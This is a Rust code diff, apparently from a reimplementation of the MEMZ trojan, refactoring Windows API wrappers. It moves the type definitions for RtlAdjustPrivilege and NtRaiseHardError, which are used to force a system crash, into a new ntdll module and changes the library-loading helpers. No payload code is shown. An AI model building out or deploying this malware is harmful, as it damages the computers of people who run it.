@@ -2,7 +2,14 @@ pub const LMEM_ZEROINIT: u8 = 0;
 
 pub mod data;
 pub mod memz;
+pub mod ntdll;
 pub mod payloads;
+
+pub mod winapi_type {
+    pub type DWORD = u32;
+    pub type PDWORD = *mut u32;
+    pub type PBYTE = *mut u8;
+}
 
 pub mod convert_str {
     // https://github.com/microsoft/windows-rs/issues/973#issuecomment-1363481060
@@ -95,23 +102,20 @@ pub mod wrap_windows_api {
 
     use crate::convert_str::{ToPCSTRWrapper, ToPCWSTRWrapper};
     use windows::{
-        core::PCWSTR,
         imp::{GetProcAddress, LoadLibraryA},
         Win32::{
             Foundation::{
-                CloseHandle, GetLastError, BOOL, HANDLE, HMODULE, HWND, INVALID_HANDLE_VALUE, NTSTATUS,
+                CloseHandle, GetLastError, BOOL, HANDLE, HMODULE, HWND, INVALID_HANDLE_VALUE,
             },
             Globalization::lstrcmpW,
             System::{
                 Diagnostics::ToolHelp::{
                     CreateToolhelp32Snapshot, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
                 },
-                Environment::GetCommandLineW,
                 ProcessStatus::GetProcessImageFileNameA,
                 Threading::{GetCurrentProcess, GetCurrentThreadId},
             },
             UI::{
-                Shell::CommandLineToArgvW,
                 WindowsAndMessaging::{
                     GetSystemMetrics, MessageBoxA, SetWindowsHookExA, UnhookWindowsHookEx, HHOOK,
                     HOOKPROC, MESSAGEBOX_RESULT, MESSAGEBOX_STYLE, SM_CXSCREEN, SM_CYSCREEN,
@@ -120,60 +124,6 @@ pub mod wrap_windows_api {
             },
         },
     };
-
-    pub type DWORD = u32;
-    pub type PDWORD = *mut u32;
-    pub type PBYTE = *mut u8;
-    pub mod ntdll_api {
-        use super::*;
-
-        pub type RtlAdjustPrivilegeFn = unsafe extern "system" fn(
-            Privilege: DWORD,
-            Enable: BOOL,
-            CurrentThread: BOOL,
-            Enabled: PBYTE
-        ) -> NTSTATUS;
-
-        pub type NtRaiseHardErrorFn = unsafe extern "system" fn(
-            ErrorStatus: NTSTATUS,
-            NumberOfParameters: DWORD,
-            UnicodeStringParameterMask: DWORD,
-            Parameters: *const DWORD,
-            ValidResponseOption: DWORD,
-            Response: PDWORD,
-        ) -> NTSTATUS;
-    }
-
-    pub struct Commandline {
-        pub arg: PCWSTR,
-        pub argc: i32,
-    }
-
-    impl Commandline {
-        pub fn new() -> Self {
-            Self {
-                arg: Self::wrapping_get_args_w().unwrap().arg,
-                argc: Self::wrapping_get_args_w().unwrap().argc,
-            }
-        }
-
-        fn wrapping_get_args_w() -> Result<Commandline, ()> {
-            unsafe {
-                let mut argc = 0;
-                let argv = CommandLineToArgvW(GetCommandLineW(), &mut argc);
-
-                if !argv.is_null() {
-                    let arg = *argv;
-                    Ok(Commandline {
-                        arg: PCWSTR(arg.0),
-                        argc: argc,
-                    })
-                } else {
-                    Err(eprintln!("Commandline Error\n{:?}", GetLastError()))
-                }
-            }
-        }
-    }
 
     pub struct Resolution {
         pub scrw: i32,
@@ -318,7 +268,7 @@ pub mod wrap_windows_api {
         }
     }
 
-    pub fn wrap_load_library_a<T>(name: T) -> Result<isize, ()>
+    pub fn wrap_load_library_a<T>(name: T) -> Result<HMODULE, ()>
     where
         T: ToPCSTRWrapper,
     {
@@ -329,18 +279,18 @@ pub mod wrap_windows_api {
                     "Failed LoadLibraryA\nGetLastError(): {:?}",
                     GetLastError()
                 )),
-                v => Ok(v),
+                v => Ok(HMODULE(v)),
             }
         }
     }
 
-    pub fn wrap_get_proc_address<T>(library: isize, name: T) -> Result<*const c_void, ()>
+    pub fn wrap_get_proc_address<T>(library: HMODULE, name: T) -> Result<*const c_void, ()>
     where
         T: ToPCSTRWrapper,
     {
         let name = *name.to_pcstr();
         unsafe {
-            let ret = GetProcAddress(library, name);
+            let ret = GetProcAddress(library.0, name);
             if ret.is_null() {
                 Err(eprintln!(
                     "Failed GetProcAddress\nGetLastError(): {:?}",
